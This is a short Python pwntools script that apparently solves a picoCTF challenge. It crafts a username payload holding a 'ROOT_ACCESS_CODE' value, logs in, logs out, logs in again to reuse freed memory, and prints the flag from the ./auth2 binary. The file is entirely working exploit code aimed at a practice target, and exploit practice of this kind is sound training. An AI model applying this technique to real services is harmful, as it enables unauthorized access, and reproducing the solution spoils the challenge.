from pwn import *

host = 'jupiter.challenges.picoctf.org'
port = 52867

# p = connect(host, port)
p = process('./auth2')

AC1 = 0x4343415f544f4f52
AC2 = 0x45444f435f535345

def select_menu(io, command):
    io.sendlineafter("]> ", (command))

def login(io, name):
    log.info("Logging in as {} ({})".format(name, enhex(name)))
    select_menu(io, "login")
    io.sendlineafter("Please enter the length of your username", str.encode(str(len(name))))
    io.sendlineafter("Please enter your username", (name))

def logout(io):
    log.info("Logging out")
    select_menu(io, "logout")
    
def print_flag(io):
    log.info("Printing flag")
    select_menu(io, "print-flag")

def quit(io):
    log.info("Quitting")
    select_menu(io, "quit")

junk = b"JUNK"
payload = junk*2 + p64(AC1) + p64(AC2) + junk*2
login(p, payload)
logout(p)
login(p, junk)
print_flag(p)
quit(p)

print(p.recvall())
